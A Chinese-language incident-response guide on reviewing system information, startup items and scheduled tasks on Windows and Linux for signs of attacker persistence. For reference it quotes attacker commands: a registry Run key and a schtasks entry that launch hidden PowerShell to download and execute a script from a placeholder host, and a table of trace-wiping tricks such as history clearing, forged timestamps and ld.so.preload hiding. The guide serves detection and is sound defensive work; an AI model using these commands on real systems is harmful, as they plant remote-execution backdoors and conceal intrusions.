# 系统信息 / 启动项 / 计划任务

排查的第一步：**先摸清这台机器是什么，再决定往哪查**。

---

## 一、系统基本信息

### Windows

```cmd
msinfo32            :: ⭐ 微软系统信息工具，最全
systeminfo          :: 命令行精简版（主机名、OS 版本、补丁）
```

`msinfo32` 的「软件环境」下有**六个直接可用于排查的分支**：

| 分支 | 用途 |
|---|---|
| 正在运行任务 | 进程名、**路径、PID** |
| 服务 | 服务名、状态、**路径** |
| 系统驱动程序 | 驱动名、描述、文件 |
| 加载的模块 | 模块名、**路径**（找被注入的 DLL） |
| 启动程序 | 启动项的命令、用户名、位置 |
| — | 硬件资源 / 组件 |

### Linux

```bash
lscpu                   # CPU 型号/主频/内核
uname -a                # ⭐ 操作系统与内核信息
cat /proc/version       # OS 版本
lsmod                   # ⭐ 已载入的内核模块（对照 /proc/modules 查隐藏模块）
hostnamectl             # 主机名与环境
uptime                  # 运行时长、负载（异常高负载 = 挖矿信号）
```

---

## 二、启动项

攻击者的持久化最爱。**「重启后还能不能活」是判断后门的关键**。

### Windows

#### ① 系统配置对话框

```cmd
msconfig            :: 查看命名异常的启动项
```

发现异常项后：**先记录它指向的路径，再去该路径删除文件**（不要只取消勾选）。

#### ② 注册表（⭐ 核心）

```cmd
regedit
```

**三个必查 Run 键**：

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**其他常被利用的键**（《指南》第 3 章后门篇）：

```
# Winlogon\Userinit（登录时由 winlogon 运行指定程序）
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
:: 正常值: "Userinit"="C:\Windows\system32\userinit.exe,"
:: 后门特征: 逗号后面追加了 powershell.exe / 其他程序

# Logon Scripts（HKCU\Environment 下新建字符串值 UserInitMprLogonScript）
HKEY_CURRENT_USER\Environment\
:: 键值设为 bat 的绝对路径，如 c:\test.bat

# DLL 劫持用的排除列表
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls
```

**无文件后门典型形态**（注册表里只存一行 PowerShell）：

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ ^
  /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ^
      \"IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:8888/logo.gif'))\"" /f
```

> **判读信号**：`-nop -w hidden -c IEX downloadstring` = 典型远程下载执行后门，**看到就是恶意**。

#### ③ 启动文件夹 / 组策略

```cmd
shell:startup        :: 用户启动目录（默认应为空）
gpedit.msc           :: 组策略 → 脚本(启动/关机)  ← 隐蔽性高，常被利用
```

> ⚠️ **Windows 家庭版没有 `gpedit.msc`**。家庭版环境改查注册表对应项。

#### ④ 工具

**Autoruns**（Sysinternals）—— 覆盖范围远超 msconfig，是查启动项的标准工具。
本工具箱位置：`bin/Autoruns/autoruns64.exe`

### Linux

#### ⭐ 运行级别与 init 配置

| 运行级别 | 含义 |
|---|---|
| 0 | 关机（默认不能为 0） |
| 1 | 单用户模式，root 权限，禁止远程登录（类似 Windows 安全模式） |
| 2 | 多用户，无 NFS |
| 3 | ⭐ 完全多用户（有 NFS），字符界面 |
| 4 | 保留 |
| 5 | X11 图形界面 |
| 6 | 重启（默认不能为 6） |

```bash
runlevel                    # 当前运行级别
vi /etc/inittab             # 默认级别: id=3:initdefault

# init 配置文件（随版本变化）
# CentOS 5  : /etc/inittab
# CentOS 6  : /etc/inittab、/etc/init/*.conf
# CentOS 7  : /etc/systemd/system、/usr/lib/systemd/system
```

#### ⭐ 自启动目录清单（重点排查）

```bash
/etc/rc.local               # 每次启动执行（用户登录前）
/etc/rc.d/rc[0-6].d/        # 7 个运行级别各一个（/etc/rc[0-6].d 是软链接）
/etc/rc.d/init.d/           # 真实脚本存放处
/etc/init/*.conf
/etc/systemd/system/
/etc/profile.d/             # 登录时执行
/etc/inittab
```

**rc*.d 目录内文件的命名规则**（考点）：

```
字母S[K] + 两位数字 + 程序名
  S (Start) → 启动时执行
  K (Kill)  → 关闭时执行
例: S100ssh
真实文件都在 /etc/rc.d/init.d/，rc*.d 里是软链接
```

**手工加自启动的方式**（对照判读痕迹）：

```bash
ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
```

#### 自启动服务

```bash
chkconfig --list                            # 所有 RPM 包安装的服务及自启动状态
chkconfig --list | grep "3:启用\|5:启用"     # 中文环境：级别 3/5 下启用的
chkconfig --list | grep "3:on\|5:on"        # 英文环境
chkconfig --level 2345 httpd on             # 开启自启动
ntsysv                                      # 图形化管理
ls -l /etc/rc.d/rc3.d/                      # 看某个级别的软链接
```

#### systemd（CentOS 7+）

```bash
systemctl list-unit-files --type=service --state=enabled
systemctl list-timers --all
systemctl status <service>
systemctl cat <service>                     # ⭐ 看完整 unit 定义
```

> **判据**：服务的 `ExecStart` 指向 `/tmp`、`/dev/shm`、`/var/tmp` 等临时目录 ⇒ 高度可疑。

---

## 三、计划任务

### Windows

```cmd
schtasks /query /fo LIST /v            # ⭐ 命令行列出全部（含隐藏）
taskschd.msc                           # 任务计划程序图形界面
```

**任务定义文件的存放位置**（可直接看文件）：

```cmd
C:\WINDOWS\System32\Tasks
```

> **判据**：出现**非自定义的、名字莫名的任务**即为可疑。真实案例中的 `Autocheck`、`Ddrivers`、`WebServers` 就是攻击者加的，其动作是**用 `cmd` 执行 `mshta` 加载远程恶意文件**。

**攻击者创建任务的典型命令**（对照判读）：

```cmd
schtasks /create /sc minute /mo 1 /tn "Security Script" /tr "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:8888/logo.gif'))\""
```

> 💡 cmd 里单引号会被替换成双引号，所以构造时用三个双引号 `"""` 转义。

### Linux

```bash
crontab -l                  # 当前用户的定时任务
crontab -e                  # 编辑
crontab -r                  # ⚠️ 删除所有任务（慎用）

ls -la /var/spool/cron/     # 各用户的 crontab（root 的在 /var/spool/cron/root）
cat /etc/crontab            # ⭐ 系统级（仅 root 可改）
```

**⭐ 必查目录清单**（恶意脚本高发区）：

```bash
/var/spool/cron/*           # 用户级 cron
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/*
/etc/cron.hourly/*
/etc/cron.weekly/
/etc/cron.monthly/
/etc/anacrontab
/var/spool/anacron/*
```

```bash
more /etc/cron.daily/*      # 小技巧：一次看目录下所有文件
ls /etc/cron*               # 快速列出所有 cron 相关
```

**判据**：

- 每隔 N 分钟就执行一次的脚本（真实案例：**每 23 分钟**从远程网盘下载恶意文件）
- 脚本内容 **base64 编码**（如 `.aliyun.sh`）—— 解码后才是真实意图
- 脚本文件名为**隐藏文件**（`.` 开头）或**伪装成系统名**（`.aliyun.sh`、`oanacroner`）

**anacron**（异步定时任务，机器关机时会补跑）：

```bash
vi /etc/anacrontab
# @daily 10 example.daily /bin/bash /home/backup.sh
# 机器在期望时间关机时，会在开机 10 分钟后补跑
```

---

## 四、攻击者会擦痕迹——痕迹缺失本身也是线索

| 手法 | 痕迹 |
|---|---|
| `history -c` | 只清内存，**不删 `.bash_history` 文件** |
| `[空格]set +o history` | 后续命令不入历史（**行号断层**） |
| `sed -i '150,$d' .bash_history` | 历史记录**只有前 150 行** |
| `history -d [num]` | 单条被删（行号不连续） |
| `touch -r index.php webshell.php` | 时间戳与 `index.php` 一致 |
| `touch -t 1401021042.30 webshell.php` | 人为设定的精确时间戳 |
| `chattr +i evil.php` | `lsattr` 显示 `i` 属性，root 也删不掉 |
| `echo ... >> /etc/ld.so.preload` | `ps`/`top` 看不到进程 |

**Linux 历史记录加固**（对照理解为什么有的机器历史很全）：

```bash
# 让历史命令带 IP 和时间
sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile
# 在 /etc/profile 尾部追加
USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`
if [ "$USER_IP" = "" ]; then USER_IP=`hostname`; fi
export HISTTIMEFORMAT="%F %T $USER_IP `whoami` "
shopt -s histappend
export PROMPT_COMMAND="history -a"
# 生效
source /etc/profile
# 效果:  1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile
```

---

## 相关文档

- `20-accounts.md` — 账号与克隆账号
- `25-process-service.md` — 进程 / 服务 / 驱动 / 模块
- `30-file-artifacts.md` — 文件痕迹与特殊权限
- `events/cryptomining.md` — 定时任务型挖矿的完整实例
